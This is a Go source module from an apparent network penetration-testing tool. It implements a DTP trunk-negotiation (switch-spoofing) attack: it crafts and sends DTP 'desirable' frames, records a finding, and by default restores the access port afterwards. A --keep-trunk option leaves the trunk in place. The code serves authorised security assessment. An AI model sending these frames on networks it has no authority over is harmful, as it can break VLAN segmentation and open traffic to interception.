// dtp.go implements the DTP (Dynamic Trunking Protocol) attack behavior.
//
// Parity deviation: the baseline's dtp flips a port to trunk and only
// restores with --restore, leaving a persistent trunk otherwise. netpen
// restores the access port by default. Skipping the restore takes the
// explicit --keep-trunk flag, the permanent opt-in.
//
//  1. Sends a DTP "desirable" frame (trunk-status=0x03) to negotiate a trunk.
//  2. Emits a finding reporting the negotiated trunk state.
//  3. Unless --keep-trunk, arms a teardown step that sends a DTP "access"
//     frame (trunk-status=0x02) to restore the port, asserted in the
//     recorded TX order: negotiate frames then restore frames.

package l2

import (
	"context"
	"encoding/json"
	"net"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

// dtpFinding is the typed finding the DTP behavior emits.
type dtpFinding struct {
	Action     string `json:"action"`
	Mode       string `json:"mode"`
	Neighbor   string `json:"neighbor"`
	Restore    string `json:"restore"`
	Durability string `json:"durability"`
}

// RunDTP negotiates a trunk with a DTP desirable frame from the attack
// leg's MAC, which is also the neighbor TLV. It reads no target: the domain
// and trunk type are probe content. The base entry restores actively, so
// it arms the access-port restore before the first frame. The keep-trunk
// mode is permanent and arms nothing. The verdict is pending: whether the
// port went to trunk needs a tagged probe it does not have.
func RunDTP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	src := deps.AttackLeg.Addr().MAC
	mode := deps.Entry.Mode

	restoreArmed := "no"
	if deps.Entry.Restore.Kind == check.RestoreActive {
		restorePkt, err := craftDTPFrame(src, layers.DTPStatusAccess)
		if err != nil {
			return check.Verdict{}, errs.Wrap(err, "dtp: craft restore frame")
		}
		deps.Teardown.Arm("access-port-restore", func(ctx context.Context) error {
			return deps.AttackLeg.Send(ctx, restorePkt)
		})
		restoreArmed = "yes"
	}

	desirablePkt, err := craftDTPFrame(src, layers.DTPStatusDesirable)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "dtp: craft desirable frame")
	}
	if err := deps.AttackLeg.Send(ctx, desirablePkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "dtp: send desirable")
	}

	detail, _ := json.Marshal(dtpFinding{
		Action:     "trunk-negotiation",
		Mode:       modeName(mode),
		Neighbor:   src.String(),
		Restore:    restoreArmed,
		Durability: string(deps.Entry.Impact) + "/" + string(deps.Entry.Restore.Kind),
	})
	deps.Emitter.Finding("dtp", detail)

	return check.Pending("no observable: trunk formation needs a tagged probe across the port"), nil
}

// craftDTPFrame builds a full DTP frame with the given trunk-status value.
// The TLV layout matches the baseline's dtp_frame(): version(1) + TLV(domain)
// + TLV(trunk-status) + TLV(trunk-type=0xa5) + TLV(neighbor=srcMAC).
func craftDTPFrame(src net.HardwareAddr, trunkStatus uint8) ([]byte, error) {
	dtp := &layers.DTP{
		Version: 1,
		TLVs: []layers.DTPTLV{
			{Type: layers.DTPTLVTypeDomain, Value: []byte{0x00}},
			{Type: layers.DTPTLVTypeTrunkStatus, Value: []byte{trunkStatus}},
			{Type: layers.DTPTLVTypeTrunkType, Value: []byte{layers.DTPTypeNegotiated8021Q}},
			{Type: layers.DTPTLVTypeNeighbor, Value: src},
		},
	}
	return craftDot3SNAP(dtpDstMAC, src, snapPIDDTP, dtp)
}

// modeName returns the human-readable mode name for a DTP mode.
func modeName(mode string) string {
	if mode == "keep-trunk" {
		return "keep-trunk"
	}
	return "default"
}
